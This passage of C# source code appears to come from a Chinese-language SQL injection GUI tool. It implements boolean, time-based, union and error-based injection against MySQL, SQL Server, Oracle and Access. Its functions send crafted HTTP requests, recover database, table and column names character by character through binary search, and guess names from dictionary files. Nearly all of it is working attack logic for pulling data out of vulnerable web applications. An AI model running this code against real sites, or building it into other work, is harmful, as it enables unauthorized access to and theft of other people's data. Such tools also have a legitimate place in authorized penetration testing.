            }
        }


        /// <summary>
        /// 获取数据库名称mssql
        /// </summary>
        /// <param name="oindex">下标</param>
        public void getDBNameByBoolBySQLServer(Object oindex)
        {
            try
            {
                int db_index = int.Parse(oindex.ToString());
                //判断对应下标的数据库长度
                String data_payload = MSSQL.db_value.Replace("{index}", db_index.ToString());
                int len = getValueByStepUp(MSSQL.bool_length.Replace("{data}", data_payload), 0, 10);

                this.Invoke(new StringDelegate(log), "数据库" + db_index + "长度为-----：" + len);

                //判断当前数据库对应的ascii码
                String va_payload = MSSQL.bool_value.Replace("{data}", MSSQL.db_value.Replace("{index}", oindex.ToString()));
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    if (status != 1)
                    {
                        break;
                    }
                    //取值payload，替换对应下标值
                    //select UNICODE(substring(@@version,{index},1))
                    //取值payload，替换对应下标值
                    String unicode_data_payload = MSSQL.unicode_value.Replace("{index}", i + "").Replace("{data}", data_payload);
                    //取unicode转换后的长度
                    String unicode_data_len_payload = MSSQL.bool_length.Replace("{data}", unicode_data_payload);

                    //长度范围2-8支持大部分语言
                    int unicode_data_len = getValue(unicode_data_len_payload, 1, 8);
                    int m_index = 1;
                    StringBuilder unicodes = new StringBuilder();
                    while (m_index <= unicode_data_len && status == 1)
                    {
                        //获取多字节
                        String substr_payload = MSSQL.substr.Replace("{data}", unicode_data_payload).Replace("{index}", m_index.ToString());
                        //单个unicode值范围是0-9
                        int unicode = getValue(MSSQL.bool_value.Replace("{data}", substr_payload), 0, 9);
                        unicodes.Append(unicode.ToString());
                        m_index++;
                    }

                    if (Tools.convertToInt(unicodes.ToString()) > 255)
                    {
                        value += Tools.unHexByUnicode(int.Parse(unicodes.ToString()), config.db_encoding);
                    }
                    else
                    {
                        value += (char)Tools.convertToInt(unicodes.ToString());
                    }
                }
                this.Invoke(new StringDelegate(log), "数据库" + db_index + "的名称为：" + value);
                this.Invoke(new addDBToTreeListDelegate(addDBToTreeList), value);

            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取数据库名称时发生异常：" + e.Message);
            }
        }

        /// <summary>
        /// 获取数据库名称
        /// </summary>
        /// <param name="oindex">下标limit</param>
        public void getDBNameByBoolByOracle(Object oindex)
        {
            try
            {
                int db_index = int.Parse(oindex.ToString());
                //判断对应下标的数据库长度
                String payload_len = Oracle.bool_length.Replace("{data}", Oracle.db_value.Replace("{index}", oindex.ToString()));

                //判断当前数据库长度限制1-50
                int len = getValue(payload_len, 1, 50);
                this.Invoke(new StringDelegate(log), "数据库" + (db_index + 1) + "长度为-----：" + len);

                //判断当前数据库对应的ascii码
                String va_payload = Oracle.bool_value.Replace("{data}", Oracle.db_value.Replace("{index}", oindex.ToString()));
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    if (status != 1)
                    {
                        break;
                    }
                    //取值payload，替换对应下标值
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    int ascii = getValue(tmp_va_payload, 0, 128);
                    value += ((char)ascii).ToString();
                }
                this.Invoke(new StringDelegate(log), "数据库" + db_index + "的名称为：" + value);
                this.Invoke(new addDBToTreeListDelegate(addDBToTreeList), value);

            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取数据库名称时发生异常：" + e.Message);
            }
        }


        /// <summary>
        /// 获取数据库名称Union方式MySQL
        /// </summary>
        /// <param name="oindex">下标limit</param>
        public void getDBNameByUnionByMySQL(Object oindex)
        {
            try
            {
                //获取数据库数量
                List<String> data_list = new List<String>();
                data_list.Add(MySQL5.db_value.Replace("{index}", oindex.ToString()));
                String db_Name_data = MySQL5.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, "1", data_list, null, null, -1);
                String result = getOneDataByUnionOrError(MySQL5.union_value.Replace("{data}", db_Name_data));
                this.Invoke(new StringDelegate(log), "数据库" + oindex + "的名称为：" + result);
                this.Invoke(new addDBToTreeListDelegate(addDBToTreeList), result);
            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取数据库名称时发生异常：" + e.Message);
            }
        }

        /// <summary>
        /// 获取数据库名称Union方式SQLServer
        /// </summary>
        /// <param name="oindex">下标limit</param>
        public void getDBNameByUnionBySQLServer(Object oindex)
        {
            try
            {
                //获取数据库数量
                String result = getOneDataByUnionOrError(MSSQL.getUnionDataValue(config.columnsCount, config.showColumn, 1, MSSQL.db_value, "", "", oindex.ToString()));
                this.Invoke(new StringDelegate(log), "数据库" + oindex + "的名称为：" + result);
                this.Invoke(new addDBToTreeListDelegate(addDBToTreeList), result);
            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取数据库名称时发生异常：" + e.Message);
            }
        }

        /// <summary>
        /// 获取数据库名称Union方式Oracle
        /// </summary>
        /// <param name="oindex">下标limit</param>
        public void getDBNameByUnionByOracle(Object oindex)
        {
            try
            {
                //获取数据库数量
                String result = getOneDataByUnionOrError(Oracle.getUnionDataValue(config.columnsCount, config.showColumn, Oracle.db_value, "", "", oindex.ToString()));
                this.Invoke(new StringDelegate(log), "数据库" + oindex + "的名称为：" + result);
                this.Invoke(new addDBToTreeListDelegate(addDBToTreeList), result);
            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取数据库名称时发生异常：" + e.Message);
            }
        }


        /// <summary>
        /// 获取数据库名称Error方式mysql
        /// </summary>
        /// <param name="oindex">下标limit</param>
        public void getDBNameByErrorByMySQL(Object oindex)
        {
            try
            {
                List<String> data_list = new List<String>();
                data_list.Add(MySQL5.db_value.Replace("{index}", oindex.ToString()));
                String db_Name_data = MySQL5.creatMySQLColumnsStrByError(data_list, null, null, -1);
                String result = getOneDataByUnionOrError(MySQL5.error_value.Replace("{data}", db_Name_data));
                this.Invoke(new StringDelegate(log), "数据库" + oindex + "的名称为：" + result);
                this.Invoke(new addDBToTreeListDelegate(addDBToTreeList), result);
            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取数据库名称时发生异常：" + e.Message);
            }
        }

        /// <summary>
        /// 获取数据库名称Error方式mysql
        /// </summary>
        /// <param name="oindex">下标limit</param>
        public void getDBNameByErrorBySQLServer(Object oindex)
        {
            try
            {
                String result = getOneDataByUnionOrError(MSSQL.error_value.Replace("{data}", MSSQL.db_value.Replace("{index}", oindex.ToString())));
                //HTML解码
                result = HttpUtility.HtmlDecode(result);
                this.Invoke(new StringDelegate(log), "数据库" + oindex + "的名称为：" + result);
                this.Invoke(new addDBToTreeListDelegate(addDBToTreeList), result);
            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取数据库名称时发生异常：" + e.Message);
            }
        }

        /// <summary>
        /// 获取数据库名称Error方式oracle
        /// </summary>
        /// <param name="oindex">下标limit</param>
        public void getDBNameByErrorByOracle(Object oindex)
        {
            try
            {
                String result = getOneHexDataByUnionOrError(Oracle.getErrorDataValue(Oracle.db_value, "", "", oindex.ToString()));
                //HTML解码
                result = HttpUtility.HtmlDecode(result);
                this.Invoke(new StringDelegate(log), "数据库" + oindex + "的名称为：" + result);
                this.Invoke(new addDBToTreeListDelegate(addDBToTreeList), result);
            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取数据库名称时发生异常：" + e.Message);
            }
        }



        /// <summary>
        /// bool方式获取mysql表
        /// </summary>
        /// <param name="osn"></param>
        public void getTableNameValueByBoolByMySQL(Object osn)
        {

            try
            {
                SelectNode sn = (SelectNode)osn;
                int selectIndex = sn.tn.Index;
                //判断当前表长度
                String data_payload = MySQL5.table_value.Replace("'{dbname}'", Tools.strToHex(sn.dbname, "UTF-8")).Replace("{index}", sn.limit + "");
                int len = 0;
                if (config.keyType.Equals(KeyType.Time))
                {
                    len = getValue(MySQL5.getBoolCountBySleep(MySQL5.bool_length.Replace("{data}", data_payload), config.maxTime), 1, 50);
                }
                else
                {
                    len = getValue(MySQL5.ver_length.Replace("{data}", data_payload), 1, 50);
                }


                //判断当前数据库对应的ascii码
                String va_payload = MySQL5.ver_value.Replace("{data}", data_payload);
                if (config.keyType.Equals(KeyType.Time))
                {
                    va_payload = MySQL5.getBoolCountBySleep(MySQL5.bool_value, config.maxTime).Replace("{data}", data_payload);
                }

                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    //取值payload，替换对应下标值
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    int ascii = getValue(tmp_va_payload, 0, 128);
                    value += ((char)ascii).ToString();
                }
                this.Invoke(new StringDelegate(log), "数据库" + sn.dbname + "发现表：" + value);
                this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, value, "table");

            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取值发生异常：" + e.Message);
            }
        }

        /// <summary>
        /// bool方式获取oracle表
        /// </summary>
        /// <param name="osn"></param>
        public void getTableNameValueByBoolByOracle(Object osn)
        {

            try
            {
                SelectNode sn = (SelectNode)osn;
                int selectIndex = sn.tn.Index;
                //判断当前表长度
                String data_payload = Oracle.table_value.Replace("{dbname}", sn.dbname).Replace("{index}", sn.limit + "");
                int len = getValue(Oracle.bool_length.Replace("{data}", data_payload), 1, 50);

                //判断当前数据库对应的ascii码
                String va_payload = Oracle.bool_value.Replace("{data}", data_payload);
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    //取值payload，替换对应下标值
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    int ascii = getValue(tmp_va_payload, 0, 128);
                    value += ((char)ascii).ToString();
                }
                this.Invoke(new StringDelegate(log), "数据库" + sn.dbname + "发现表：" + value);
                this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, value, "table");

            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取值发生异常：" + e.Message);
            }
        }


        public void getTableNameValueByBoolBySQLServer(Object osn)
        {

            try
            {
                SelectNode sn = (SelectNode)osn;
                //判断当前表长度
                String data_payload = MSSQL.table_value.Replace("{index}", sn.limit.ToString()).Replace("{dbname}", sn.dbname);
                int len = getValueByStepUp(MSSQL.bool_length.Replace("{data}", data_payload), 0, 10);
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    //取值payload，替换对应下标值
                    //select UNICODE(substring(@@version,{index},1))
                    //取值payload，替换对应下标值
                    String unicode_data_payload = MSSQL.unicode_value.Replace("{index}", i + "").Replace("{data}", data_payload);
                    //取unicode转换后的长度
                    String unicode_data_len_payload = MSSQL.bool_length.Replace("{data}", unicode_data_payload);

                    //长度范围2-8支持大部分语言
                    int unicode_data_len = getValue(unicode_data_len_payload, 1, 8);
                    int m_index = 1;
                    StringBuilder unicodes = new StringBuilder();
                    while (m_index <= unicode_data_len)
                    {
                        //获取多字节
                        String substr_payload = MSSQL.substr.Replace("{data}", unicode_data_payload).Replace("{index}", m_index.ToString());
                        //单个unicode值范围是0-9
                        int unicode = getValue(MSSQL.bool_value.Replace("{data}", substr_payload), 0, 9);
                        unicodes.Append(unicode.ToString());
                        m_index++;
                    }

                    if (Tools.convertToInt(unicodes.ToString()) > 255)
                    {
                        value += Tools.unHexByUnicode(int.Parse(unicodes.ToString()), config.db_encoding);
                    }
                    else
                    {
                        value += (char)Tools.convertToInt(unicodes.ToString());
                    }
                }
                this.Invoke(new StringDelegate(log), "数据库" + sn.dbname + "发现表：" + value);
                this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, value, "table");

            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取值发生异常：" + e.Message);
            }
        }



        /// <summary>
        /// 获取表名，多线程调用mysql
        /// </summary>
        /// <param name="osn"></param>
        public void getTableNameValueByUnionByMySQL(Object osn)
        {

            SelectNode sn = (SelectNode)osn;
            List<String> data_list = new List<String>();
            data_list.Add(MySQL5.table_value.Replace("'{dbname}'", Tools.strToHex(sn.dbname, "UTF-8")).Replace("{index}", sn.limit.ToString()));
            String tables_value_payload = MySQL5.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, "1", data_list, null, null, -1);
            String result = getOneDataByUnionOrError(MySQL5.union_value.Replace("{data}", tables_value_payload));

            this.Invoke(new StringDelegate(log), "数据库" + sn.dbname + "发现表：" + result);
            this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "table");
        }
        /// <summary>
        /// 获取表名，多线程调用sqlserver
        /// </summary>
        /// <param name="osn"></param>
        public void getTableNameValueByUnionBySQLServer(Object osn)
        {

            SelectNode sn = (SelectNode)osn;
            String tables_value_payload = MSSQL.getUnionDataValue(config.columnsCount, config.showColumn, 1, MSSQL.table_value, sn.dbname, sn.tableName, sn.limit.ToString());
            String result = getOneDataByUnionOrError(tables_value_payload);

            this.Invoke(new StringDelegate(log), "数据库" + sn.dbname + "发现表：" + result);
            this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "table");
        }

        /// <summary>
        /// 获取表名，多线程调用sqlserver
        /// </summary>
        /// <param name="osn"></param>
        public void getTableNameValueByUnionByOracle(Object osn)
        {

            SelectNode sn = (SelectNode)osn;
            String tables_value_payload = Oracle.getUnionDataValue(config.columnsCount, config.showColumn, Oracle.table_value, sn.dbname, "", sn.limit.ToString());
            String result = getOneDataByUnionOrError(tables_value_payload);

            this.Invoke(new StringDelegate(log), "用户" + sn.dbname + "发现表：" + result);
            this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "table");
        }

        public void getTableNameValueByErrorByMySQL(Object osn)
        {

            SelectNode sn = (SelectNode)osn;
            List<String> data_list = new List<String>();
            data_list.Add(MySQL5.table_value.Replace("'{dbname}'", Tools.strToHex(sn.dbname, "UTF-8")).Replace("{index}", sn.limit.ToString()));
            String table_value_payload = MySQL5.creatMySQLColumnsStrByError(data_list, null, null, -1);
            String result = getOneDataByUnionOrError(MySQL5.error_value.Replace("{data}", table_value_payload));

            this.Invoke(new StringDelegate(log), "数据库" + sn.dbname + "发现表：" + result);
            this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "table");
        }

        public void getTableNameValueByErrorBySQLServer(Object osn)
        {

            SelectNode sn = (SelectNode)osn;
            List<String> data_list = new List<String>();
            String result = getOneDataByUnionOrError(MSSQL.error_value.Replace("{data}", MSSQL.table_value.Replace("{dbname}", sn.dbname).Replace("{index}", sn.limit.ToString())));

            this.Invoke(new StringDelegate(log), "数据库" + sn.dbname + "发现表：" + result);
            this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "table");
        }

        public void getTableNameValueByErrorByOracle(Object osn)
        {

            SelectNode sn = (SelectNode)osn;
            List<String> data_list = new List<String>();
            String result = getOneHexDataByUnionOrError(Oracle.getErrorDataValue(Oracle.table_value, sn.dbname, "", sn.limit.ToString()));

            this.Invoke(new StringDelegate(log), "数据库" + sn.dbname + "发现表：" + result);
            this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "table");
        }


        delegate void addNodeToTreeListDelegate(TreeNode tn, String text, String type);

        public void addNodeToTreeList(TreeNode tn, String text, String type)
        {
            TreeNode stn = new TreeNode(text);
            stn.Tag = type;
            if ("dbs".Equals(type))
            {
                stn.ImageIndex = 4;
            }
            else if ("table".Equals(type))
            {
                stn.ImageIndex = 1;
            }
            else if ("column".Equals(type))
            {
                stn.ImageIndex = 2;
            }
            tn.Nodes.Add(stn);
            tn.Expand();
        }


        /// <summary>
        /// 二分法判断
        /// </summary>
        /// <param name="payLoadStr">获取数据paylaod</param>
        /// <param name="start">开始值</param>
        /// <param name="end">最大值</param>
        /// <returns></returns>
        public int getValue(String payLoadStr, int start, int end)
        {
            int len = 0;
            String payload = "";
            int min = start;
            int olen = 0;
            while (status == 1)
            {
                //2分法获取中间数字
                len = Tools.getLargeNum(start, end);
                if (olen == len)
                {
                    len = end;
                    break;
                }
                olen = len;
                payload = payLoadStr.Replace("{len}", len + "");
                ServerInfo server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                Boolean exists = Tools.isTrue(server, config.key, config.reverseKey, config.keyType);
                if (exists)
                {
                    if (len == start)
                    {
                        return end;
                    }
                    start = len;
                }
                else
                {
                    if (len == start)
                    {
                        return len;
                    }
                    end = len;
                }
            }
            return len;

        }

        delegate void addDBToTreeListDelegate(String dbName);
        public void addDBToTreeList(String dbName)
        {

            TreeNode tn = new TreeNode(dbName);
            tn.Tag = "dbs";
            this.data_tvw_dbs.Nodes.Add(tn);

        }


        /// <summary>
        /// 递增获取值
        /// </summary>
        /// <param name="payLoadStr">获取数据paylaod</param>
        /// <param name="start">开始值</param>
        /// <param name="end">最大值</param>
        /// <returns></returns>
        public int getValueByStepUp(String payLoadStr, int start, int step)
        {
            int len = 0;
            int starts = start;
            String payload = "";
            while (status == 1)
            {
                payload = payLoadStr.Replace("{len}", start + "");
                ServerInfo server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                if (Tools.isTrue(server, config.key, config.reverseKey, config.keyType))
                {
                    start += step;
                }
                else
                {

                    //确定范围了
                    int s = start - step;
                    if (start <= 0)
                    {
                        break;
                    }
                    else
                    {
                        len = getValue(payLoadStr, s, start);
                        break;
                    }
                }
            }
            return len;
        }

        public delegate void sendHTTPLogDelegate(String index, ServerInfo server, String payload);

        public void sendHTTPLog(String index, ServerInfo server, String payload)
        {
            ListViewItem lvi = new ListViewItem(index);
            lvi.Tag = index;
            lvi.SubItems.Add(payload);
            lvi.SubItems.Add(server.runTime + "");
            lvi.SubItems.Add(server.code + "");
            lvi.SubItems.Add(server.length + "");
            lvi.SubItems.Add(server.sleepTime.ToString());
            this.log_lvw_httpLog.Items.Add(lvi);
        }


        public Boolean findKeyInBody(String payLoadStr, int num)
        {

            String payload = payLoadStr.Replace("{len}", num + ""); ;
            while (status == 1)
            {
                ServerInfo server = null;
                int tryCount = 0;
                while (tryCount <= config.reTry)
                {
                    try
                    {
                        server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                        break;
                    }
                    catch (Exception e)
                    {
                        tryCount++;
                        this.Invoke(new StringDelegate(log), "发包失败！异常：" + e.Message);
                    }
                }
                if (server == null)
                {
                    return false;
                }

                return Tools.isTrue(server, config.key, config.reverseKey, config.keyType);

            }
            return false;

        }

        public Boolean findKeyInBody(String payLoadStr)
        {
            while (true)
            {
                ServerInfo server = null;
                int tryCount = 0;
                while (tryCount <= config.reTry)
                {
                    try
                    {
                        server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payLoadStr, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                        break;
                    }
                    catch (Exception e)
                    {
                        tryCount++;
                        this.Invoke(new StringDelegate(log), "发包失败！异常：" + e.Message);
                    }
                }
                if (server == null)
                {
                    return false;
                }

                return Tools.isTrue(server, config.key, config.reverseKey, config.keyType);

            }

        }

        public delegate void StringDelegate(String str);
        public void log(String log)
        {
            if (config.isOpenInfoLog)
            {
                if (this.txt_log.Left > 10000)
                {
                    this.txt_log.Text = "";
                }
                this.txt_log.AppendText(@log + "----" + DateTime.Now + "\r\n"+FileTool.error);
            }
        }

        public Boolean isSetInjectPoint()
        {

            if (this.txt_inject_request.Text.IndexOf(setInjectStr) == -1)
            {
                MessageBox.Show("未设置注入点！");
                return false;
            }
            else
            {
                return true;
            }

        }


        private void btn_inject_setInject_Click(object sender, EventArgs e)
        {
            this.txt_inject_request.Text = this.txt_inject_request.Text.Insert(this.txt_inject_request.SelectionStart, setInjectStr);
        }

        private void btn_inject_setEncodingRange_Click(object sender, EventArgs e)
        {

            this.txt_inject_request.SelectedText = "<sEncode>" + this.txt_inject_request.SelectedText + "<eEncode>";
        }

        AddNode an = null;

        private void data_dbs_tsmi_deleteNode_Click(object sender, EventArgs e)
        {
            if (this.data_tvw_dbs.SelectedNode != null)
            {

                this.data_tvw_dbs.SelectedNode.Remove();
            }
        }
        public void getDBSByError(DBType dbType)
        {
            //获取数据库数量
            List<String> data_list = new List<String>();
            String db_Count_data = "";
            String result = "";
            int db_len = 0;
            switch (dbType)
            {
                case DBType.Access:
                    MessageBox.Show("抱歉Access数据库，不支持错误显示注入！");
                    break;
                case DBType.MySQL4:
                    MessageBox.Show("抱歉MySQL4数据库，不支持错误显示注入！");
                    break;
                case DBType.MySQL5:

                    data_list.Add(MySQL5.dbs_count);
                    db_Count_data = MySQL5.creatMySQLColumnsStrByError(data_list, null, null, -1);
                    result = getOneDataByUnionOrError(MySQL5.error_value.Replace("{data}", db_Count_data));
                    this.Invoke(new StringDelegate(log), "报告大侠，我发现了" + result + "个数据库！");
                    db_len = Tools.convertToInt(result);
                    this.dbsCount = db_len;
                    if (db_len > 0)
                    {
                        for (int j = 0; j < db_len; j++)
                        {
                            //获取对应的数据库

                            MyThreadPool.initThread(new ParameterizedThreadStart(getDBNameByErrorByMySQL), j);
                        }

                    }
                    else
                    {
                        MessageBox.Show("没有发现数据库，奇怪了！");
                    }
                    break;
                case DBType.SQLServer:
                    //获取数据库数量
                    result = getOneDataByUnionOrError(MSSQL.error_value.Replace("{data}", MSSQL.dbs_count));
                    this.Invoke(new StringDelegate(log), "报告大侠，我发现了" + result + "个数据库！");
                    db_len = Tools.convertToInt(result);
                    this.dbsCount = db_len;
                    if (db_len > 0)
                    {
                        //注意这里db_name()下标从1开始
                        for (int j = 1; j <= db_len; j++)
                        {
                            //获取对应的数据库
                            MyThreadPool.initThread(new ParameterizedThreadStart(getDBNameByErrorBySQLServer), j);
                        }

                    }
                    else
                    {
                        MessageBox.Show("没有发现数据库，奇怪了！");
                    }
                    break;
                case DBType.Oracle:
                    //获取数据库数量
                    result = getOneHexDataByUnionOrError(Oracle.getErrorDataValue(Oracle.dbs_count, "", "", ""));
                    this.Invoke(new StringDelegate(log), "报告大侠，我发现了" + result + "个数据库用户！");
                    db_len = Tools.convertToInt(result);
                    this.dbsCount = db_len;
                    if (db_len > 0)
                    {
                        //下标从1开始
                        for (int j = 1; j <= db_len; j++)
                        {
                            //获取对应的数据库
                            MyThreadPool.initThread(new ParameterizedThreadStart(getDBNameByErrorByOracle), j);
                        }

                    }
                    else
                    {
                        MessageBox.Show("没有发现数据库，奇怪了！");
                    }
                    break;
            }

        }
        public void getDBSByUnion(DBType dbType)
        {
            List<String> data_list = new List<String>();
            String db_Count_data = "";
            String result = "";
            int db_len = 0;
            switch (dbType)
            {
                case DBType.Access:
                    break;
                case DBType.MySQL4:
                    break;
                case DBType.MySQL5:
                    //获取数据库数量
                    data_list.Add(MySQL5.dbs_count);
                    db_Count_data = MySQL5.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, "1", data_list, null, null, -1);
                    result = getOneDataByUnionOrError(MySQL5.union_value.Replace("{data}", db_Count_data));

                    this.Invoke(new StringDelegate(log), "报告大侠，我发现了" + result + "个数据库！");
                    db_len = Tools.convertToInt(result);
                    this.dbsCount = db_len;
                    if (db_len > 0)
                    {
                        for (int j = 0; j < db_len; j++)
                        {
                            //获取对应的数据库
                            MyThreadPool.initThread(new ParameterizedThreadStart(getDBNameByUnionByMySQL), j);
                        }
                    }
                    else
                    {
                        MessageBox.Show("没有发现数据库，奇怪了！");
                    }
                    break;
                case DBType.SQLServer:
                    //获取数据库数量
                    result = getOneDataByUnionOrError(MSSQL.getUnionDataValue(config.columnsCount, config.showColumn, 1, MSSQL.dbs_count));

                    this.Invoke(new StringDelegate(log), "报告大侠，我发现了" + result + "个数据库！");
                    db_len = Tools.convertToInt(result);
                    this.dbsCount = db_len;
                    if (db_len > 0)
                    {
                        for (int j = 1; j <= db_len; j++)
                        {
                            //获取对应的数据库
                            MyThreadPool.initThread(new ParameterizedThreadStart(getDBNameByUnionBySQLServer), j);
                        }
                    }
                    else
                    {
                        MessageBox.Show("没有发现数据库，奇怪了！");
                    }
                    break;
                case DBType.Oracle:
                    //获取数据库数量
                    result = getOneDataByUnionOrError(Oracle.getUnionDataValue(config.columnsCount, config.showColumn, Oracle.dbs_count, "", "", ""));

                    this.Invoke(new StringDelegate(log), "报告大侠，我发现了" + result + "个数据库用户！");
                    db_len = Tools.convertToInt(result);
                    this.dbsCount = db_len;
                    if (db_len > 0)
                    {
                        for (int j = 1; j <= db_len; j++)
                        {
                            //获取对应的数据库
                            MyThreadPool.initThread(new ParameterizedThreadStart(getDBNameByUnionByOracle), j);
                        }
                    }
                    else
                    {
                        MessageBox.Show("没有发现数据库，奇怪了！");
                    }
                    break;
            }

        }
        public void getDBSByBool(DBType dbType)
        {
            int db_len = 0;
            switch (dbType)
            {

                case DBType.Access:
                    MessageBox.Show("Access数据库没有库！");
                    break;
                case DBType.MySQL4:

                    break;
                case DBType.MySQL5:
                    //获取数据库数量
                    if (KeyType.Time.Equals(config.keyType))
                    {
                        db_len = getValueByStepUp(MySQL5.getBoolCountBySleep(MySQL5.dbs_count, config.maxTime), 0, 10);
                    }
                    else
                    {
                        db_len = getValueByStepUp(MySQL5.bool_db_count, 0, 10);
                    }

                    this.Invoke(new StringDelegate(log), "报告大侠，我发现了" + db_len + "个数据库！");
                    this.dbsCount = db_len;
                    if (db_len > 0)
                    {
                        for (int j = 0; j < db_len; j++)
                        {
                            //获取对应的数据库
                            MyThreadPool.initThread(new ParameterizedThreadStart(getDBNameByBoolByMySQL), j);
                        }

                    }
                    else
                    {
                        MessageBox.Show("没有发现数据库，奇怪了！");
                    }
                    break;
                case DBType.SQLServer:
                    db_len = getValueByStepUp(MSSQL.bool_db_count, 0, 10);
                    this.Invoke(new StringDelegate(log), "报告大侠，我发现了" + db_len + "个数据库！");
                    this.dbsCount = db_len;
                    if (db_len > 0)
                    {
                        for (int j = 1; j <= db_len; j++)
                        {
                            //获取对应的数据库
                            MyThreadPool.initThread(new ParameterizedThreadStart(getDBNameByBoolBySQLServer), j);
                        }

                    }
                    else
                    {
                        MessageBox.Show("没有发现数据库，奇怪了！");
                    }
                    break;
                case DBType.Oracle:
                    db_len = getValueByStepUp(Oracle.bool_db_count, 0, 10);
                    this.Invoke(new StringDelegate(log), "报告大侠，我发现了" + db_len + "个数据库！");
                    this.dbsCount = db_len;
                    if (db_len > 0)
                    {
                        //db下标从1开始
                        for (int j = 1; j <= db_len; j++)
                        {
                            //获取对应的数据库
                            MyThreadPool.initThread(new ParameterizedThreadStart(getDBNameByBoolByOracle), j);
                        }

                    }
                    else
                    {
                        MessageBox.Show("没有发现数据库，奇怪了！");
                    }
                    break;
            }
        }

        public void checkTableIsExis(object osn)
        {
            SelectNode sn = (SelectNode)osn;
            String payload = String.Format(Comm.exists_table, sn.tableName);
            bool findKey = findKeyInBody(payload);
            if (findKey)
            {
                this.Invoke(new showLogDelegate(log), "发现表：" + sn.tableName);
                this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, sn.tableName, "table");
            }

        }

        public void checkColumnIsExis(object osn)
        {
            SelectNode sn = (SelectNode)osn;
            String payload = String.Format(Comm.exists_column, sn.columnName, sn.tableName);
            bool findKey = findKeyInBody(payload);
            if (findKey)
            {
                this.Invoke(new showLogDelegate(log), "表" + sn.tableName + "发现列：" + sn.columnName);
                this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, sn.columnName, "column");
            }

        }


        public void checkTablesDic(TreeNode tn)
        {

            //加载字典
            List<String> dirs = FileTool.readAllDic("config/tables/");
            foreach (String fpath in dirs)
            {
                if (status != 1) break;
                this.Invoke(new StringDelegate(log), "正在使用字典" + fpath + "进行盲猜！");
                List<String> tables = FileTool.readFileToList("config/tables/" + fpath);
                comm_count = tables.Count;
                for (int i = 0; i < tables.Count; i++)
                {
                    SelectNode sn = new SelectNode();
                    sn.tableName = tables[i];
                    sn.tn = tn;
                    MyThreadPool.initThread(new ParameterizedThreadStart(checkTableIsExis), sn);
                    comm_currentCount = i + 1;
                }
            }

        }

        public void checkColumnsDic(TreeNode tn)
        {

            //加载字典
            List<String> dirs = FileTool.readAllDic("config/columns/");
            foreach (String fpath in dirs)
            {
                if (status != 1) break;
                this.Invoke(new StringDelegate(log), "正在使用字典" + fpath + "进行盲猜！");
                List<String> columns = FileTool.readFileToList("config/columns/" + fpath);
                comm_count = columns.Count;
                for (int i = 0; i < columns.Count; i++)
                {
                    SelectNode sn = new SelectNode();
                    sn.columnName = columns[i];
                    sn.tableName = tn.Text;
                    sn.tn = tn;
                    MyThreadPool.initThread(new ParameterizedThreadStart(checkColumnIsExis), sn);
                    comm_currentCount = i + 1;
                }
            }

        }

        /// <summary>
        /// bool方式获取表明
        /// </summary>
        /// <param name="tn">数据库节点</param>
        public void getTabeleNameByBool(DBType dbType, TreeNode tn)
        {
            //获取当前数据库长度
            String dbname = tn.Text;
            int table_count = 0;
            switch (dbType)
            {

                case DBType.Access:
                    if (String.IsNullOrEmpty(config.key))
                    {
                        MessageBox.Show(ErrorMessage.access_no_key);
                        return;
                    }
                    checkTablesDic(tn);
                    break;
                case DBType.MySQL4:

                    break;
                case DBType.MySQL5:
                    //获取当前数据库长度

                    if (config.keyType.Equals(KeyType.Time))
                    {
                        table_count = getValueByStepUp(MySQL5.getBoolCountBySleep(MySQL5.tables_count.Replace("'{dbname}'", Tools.strToHex(dbname, "UTF-8")), config.maxTime), 0, 50);
                    }
                    else
                    {
                        table_count = getValueByStepUp(MySQL5.bool_tables_count.Replace("'{dbname}'", Tools.strToHex(dbname, "UTF-8")), 0, 50);
                    }

                    this.Invoke(new StringDelegate(log), "报告大侠，数据库" + dbname + "发现" + table_count + "个表！");
                    for (int i = 0; i < table_count; i++)
                    {
